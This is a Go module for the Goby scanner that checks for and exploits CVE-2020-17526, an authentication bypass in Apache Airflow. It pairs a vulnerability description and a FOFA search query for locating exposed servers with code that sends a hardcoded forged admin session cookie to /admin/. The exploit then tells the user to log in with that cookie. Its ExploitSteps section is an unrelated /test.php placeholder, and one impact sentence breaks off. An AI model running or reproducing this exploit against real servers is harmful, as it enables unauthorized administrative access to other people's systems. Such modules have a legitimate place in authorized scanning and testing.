package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Apache Airflow admin Unauthorized Access Vulnerability (CVE-2020-17526)",
    "Description": "<p>Attackers can create a local installation with the same version as the target, log in as an administrator, and replay the session cookie to the target to log in as an administrator on the remote computer. In this case, tools can be used to decrypt and identify the plaintext JSON string, then update the user_id parameter and resend the cookie to the server to simulate the user specified by the user_id.</p>",
    "Product": "APACHE-Airflow",
    "Homepage": "https://github.com/apache/incubator-airflow",
    "DisclosureDate": "2024-09-27",
    "PostTime": "2024-09-30",
    "Author": "2987612621@qq.com",
    "FofaQuery": "body=\"Airflow\" && body=\"https://airflow.apache.org\"",
    "GobyQuery": "body=\"Airflow\" && body=\"https://airflow.apache.org\"",
    "Level": "2",
    "Impact": "<p>Incorrect Session Validation in Airflow Webserver with default config allows a malicious Airflow user on site A where they log in normally, to access unauthorized Airflow Webserver on Site B through the session from</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://airflow.apache.org/\">https://airflow.apache.org/</a><a href=\"https://github.com/apache/incubator-airflow\"></a></p><p>2. Set access policies and whitelist access through security devices such as firewalls. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://github.com/vulhub/vulhub/blob/master/airflow/CVE-2020-17526/README.zh-cn.m"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "default",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/admin/",
                "follow_redirect": true,
                "header": {
                    "Cookie": "session=eyJ1c2VyX2lkIjoiMSIsIl9mcmVzaCI6ZmFsc2UsIl9wZXJtYW5lbnQiOnRydWV9.ZvYfcA.BmSvMd539kcGHgg8YphBIF9Akvk"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "/admin/airflow/duration?dag_id",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access",
        "2H1W"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        "CVE-2020-17526"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.7",
    "Translation": {
        "CN": {
            "Name": "Apache Airflow admin 未授权访问漏洞 （CVE-2020-17526）",
            "Product": "APACHE-Airflow",
            "Description": "<p>攻击者可以创建与目标相同版本的本地安装，以管理员身份登录并将会话cookie重播到目标以在远程计算机上以管理员身份登录。 在这种情况下，可以使用工具来解密和识别明文 json 字符串，然后更新user_id参数并将 cookie 重新发送到服务器以模拟指定了user_id的用户。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://github.com/apache/incubator-airflow\"></a><a href=\"https://airflow.apache.org/\">https://airflow.apache.org/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>在默认配置下，Airflow Webserver中的会话验证不正确，允许一个恶意的Airflow用户在站点A正常登录后，通过从站点A的会话，访问站点B上的未经授权的Airflow Webserver。<br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Apache Airflow admin Unauthorized Access Vulnerability (CVE-2020-17526)",
            "Product": "APACHE-Airflow",
            "Description": "<p>Attackers can create a local installation with the same version as the target, log in as an administrator, and replay the session cookie to the target to log in as an administrator on the remote computer. In this case, tools can be used to decrypt and identify the plaintext JSON string, then update the user_id parameter and resend the cookie to the server to simulate the user specified by the user_id.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://airflow.apache.org/\">https://airflow.apache.org/</a><a href=\"https://github.com/apache/incubator-airflow\"></a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Incorrect Session Validation in Airflow Webserver with default config allows a malicious Airflow user on site A where they log in normally, to access unauthorized Airflow Webserver on Site B through the session from<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9957"
}`

sendPayloadkhy15ky8 := func(hostInfo *httpclient.FixUrl) (bool, string, string) {
  
  vulPath := `/admin/`
  vulInfo := `Cookie: session=eyJ1c2VyX2lkIjoiMSIsIl9mcmVzaCI6ZmFsc2UsIl9wZXJtYW5lbnQiOnRydWV9.ZvYfcA.BmSvMd539kcGHgg8YphBIF9Akvk`
  
      GetRequestConfig := httpclient.NewGetRequestConfig(vulPath)
      GetRequestConfig.VerifyTls = false
      GetRequestConfig.FollowRedirect = false
      GetRequestConfig.Header.Store("Cookie","session=eyJ1c2VyX2lkIjoiMSIsIl9mcmVzaCI6ZmFsc2UsIl9wZXJtYW5lbnQiOnRydWV9.ZvYfcA.BmSvMd539kcGHgg8YphBIF9Akvk")
    
      //请求
      response, err := httpclient.DoHttpRequest(hostInfo, GetRequestConfig)
      if err != nil {
        return false, vulInfo, vulPath
      }
    
      if strings.Contains(response.RawBody, "/admin/airflow/duration?dag_id") {
        return true, vulInfo, vulPath
      }
    
  
  return false, vulInfo, vulPath
}
ExpManager.AddExploit(NewExploit(
  goutils.GetFileName(),
  expJson,
  func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
    // 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
    respBool, vulInfo, vulPath := sendPayloadkhy15ky8(hostInfo)

    // --------------------------------------------------
    // 请注意，后续为模板内容，正常情况下无需修改
    
    if respBool {
      ss.VulURL = hostInfo.Scheme() + "://" + hostInfo.HostInfo + vulPath + " hearder头中 添加cookie" + vulInfo
      return true
    }
    return false
  },
  func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
    // 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可

    // --------------------------------------------------
    // 请注意，后续为模板内容，正常情况下无需修改
    _, vulInfo, _ := sendPayloadkhy15ky8(expResult.HostInfo)
    expResult.Output = `请使用` + vulInfo + `访问/admin/页面 登录Airflow Webserver`
    expResult.Success = true
    return expResult
  },
))
}